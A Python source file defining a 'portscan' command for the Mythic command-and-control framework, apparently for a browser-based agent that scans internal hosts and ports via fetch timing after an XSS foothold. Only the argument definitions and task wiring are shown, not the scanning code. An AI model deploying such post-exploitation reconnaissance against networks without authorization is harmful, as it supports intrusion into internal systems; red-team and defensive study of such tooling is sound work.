from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class PortscanArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="targets",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(
                    required=False
                )],
                default_value="127.0.0.1",
                description="Target IPs: single, comma-separated, or CIDR /24 (e.g. 192.168.1.0/24)",
            ),
            CommandParameter(
                name="ports",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(
                    required=False
                )],
                default_value="80,443,8080,8443,3000,3389,5900,22,21,25,8000,8888,9090",
                description="Ports: comma-separated or ranges (e.g. 80,443,8000-8100)",
            ),
            CommandParameter(
                name="timeout",
                type=ParameterType.Number,
                parameter_group_info=[ParameterGroupInfo(
                    required=False
                )],
                default_value=2000,
                description="Timeout per probe in milliseconds (default 2000)",
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            try:
                self.load_args_from_json_string(self.command_line)
            except:
                pass

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)


class PortscanCommand(CommandBase):
    cmd = "portscan"
    needs_admin = False
    help_cmd = "portscan"
    description = "Scan internal network hosts/ports from the browser using fetch timing. Supports single IPs, comma-separated lists, CIDR /24, and port ranges. Demonstrates XSS-to-internal-network pivoting."
    version = 1
    author = "@grampae"
    attackmapping = ["T1046"]
    argument_class = PortscanArguments
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Browser]
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        targets = task.args.get_arg("targets") or "127.0.0.1"
        ports = task.args.get_arg("ports") or "common"
        task.display_params = "{} -> {}".format(targets, ports)
        return task

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
